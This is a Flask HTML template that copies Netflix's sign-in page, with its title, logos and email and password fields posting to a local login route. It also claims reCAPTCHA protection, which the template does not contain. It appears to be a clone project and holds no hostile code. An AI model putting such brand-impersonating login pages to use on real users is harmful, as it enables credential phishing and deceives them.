<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Netflix Sign In</title>
  <link rel="stylesheet" href="{{ url_for('static', filename='malito.css') }}">
  <link rel="icon" href="{{ url_for('static', filename='images/netflixtoptoplogo.jpeg') }}">
</head>
<body>
  <div class="header">
    <nav>
      <img src="{{ url_for('static', filename='images/netflix-logo_2-removebg-preview.png') }}" alt="logo" class="logo"> 
    </nav>
    <div class="kuingia">
      <h1>Sign In</h1>

      {% with messages = get_flashed_messages() %}
        {% if messages %}
          <div class="flash-messages">
            <ul>
              {% for message in messages %}
                <li>{{ message }}</li>
              {% endfor %}
            </ul>
          </div>
        {% endif %}
      {% endwith %}

      <!-- IMPORTANT CHANGE: action now points to 'login' route -->
      <form method="POST" action="{{ url_for('login') }}">
        <input type="email" name="username" placeholder="Email or Phone Number" required>
        <input type="password" name="password" placeholder="Password" required>
        <input type="submit" value="Sign In">
        <input type="checkbox" name="checkbox" id="checkbox">
        <label for="checkbox">Remember Me</label>
        <a href="#">Need Help?</a>
      </form>

      <div class="contente">
        <h2>New to Netflix? <a href="{{ url_for('register') }}">Sign Up now.</a></h2>
        <h2>This page is protected by Google reCAPTCHA to ensure you're not a bot. Learn more.</h2>
      </div>
    </div>
  </div>  
</body>
</html>
